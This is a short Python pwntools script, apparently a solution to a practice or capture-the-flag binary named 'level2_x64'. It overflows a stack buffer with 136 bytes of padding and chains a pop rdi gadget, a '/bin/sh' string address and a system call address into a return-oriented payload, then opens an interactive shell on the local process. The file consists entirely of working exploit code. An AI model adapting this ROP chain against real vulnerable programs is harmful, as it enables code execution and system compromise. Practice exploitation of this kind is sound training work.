from pwn import *


def ret2_libc1_4(file_name='/mnt/hgfs/Cyber Security PWN/test/pwn2_x64/level2_x64'):
    elf = ELF(file_name)
    io = process([file_name])

    print(io.recvline())

    system_plt = p64(0x000000000040063E)
    bin_sh_str = p64(0x0000000000600A90)
    pop_rdi_gadget = p64(0x00000000004006b3)

    payload = b'A' * 136

    payload += pop_rdi_gadget + bin_sh_str + system_plt

    print(payload)

    io.sendline(payload)

    io.interactive()


if __name__ == '__main__':
    ret2_libc1_4()
